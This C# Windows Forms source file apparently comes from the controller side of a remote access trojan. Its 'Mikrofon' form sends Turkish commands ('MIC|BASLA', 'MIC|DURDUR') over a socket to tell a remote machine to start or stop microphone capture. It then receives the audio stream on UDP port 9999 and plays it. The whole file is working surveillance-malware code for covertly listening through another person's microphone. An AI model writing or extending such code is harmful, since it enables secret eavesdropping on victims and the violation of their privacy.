using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using NAudio.Wave;
namespace SV
{
    public partial class Mikrofon : Form
    {
        Recorder rc;
        static Thread play;
        static IPEndPoint ipep;
        static UdpClient newsock;
        Socket sc;
        public Mikrofon(Socket sock)
        {
            InitializeComponent();
            comboBox1.SelectedIndex = 1;
            sc = sock;
        }
        class Recorder
        {
            int sample_ = 44100;
            public Recorder(int sample)
            {
                sample_ = sample;
                play = new Thread(new ThreadStart(Play));
                play.Start();

            }
            private void Play()
            {              
                WaveOutEvent output = new WaveOutEvent();
                BufferedWaveProvider buffer = new BufferedWaveProvider(new WaveFormat(sample_, 16, 1)); //Pürüzsüz bir ses geliyor bu ayarda :)
                //buffer.BufferLength = 2560 * 16; 
                //buffer.DiscardOnBufferOverflow = true;
                output.Init(buffer);
                output.Play();
                for (; ; )
                {
                    IPEndPoint remoteEP = null;
                    byte[] data = newsock.Receive(ref remoteEP);
                    buffer.AddSamples(data, 0, data.Length);
                }
                
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try { 
            sc.Send(Encoding.UTF8.GetBytes("MIC|BASLA|" + comboBox1.SelectedItem.ToString()), SocketFlags.None);
            if (ipep == null && newsock == null)
            {
                ipep = new IPEndPoint(IPAddress.Any, 9999);
                newsock = new UdpClient(ipep);

            }
            rc = new Recorder(int.Parse(comboBox1.SelectedItem.ToString()));
            button2.Enabled = true;
            button1.Enabled = false;
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try { 
            sc.Send(Encoding.UTF8.GetBytes("MIC|DURDUR"), SocketFlags.None);
            }
            catch (Exception) { }
            try
            {
                play.Abort();
            }
            catch (Exception) { }
            button2.Enabled = false;
            button1.Enabled = true;
        }

        private void Mikrofon_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                play.Abort();
            }
            catch (Exception) { }
        }
    }
}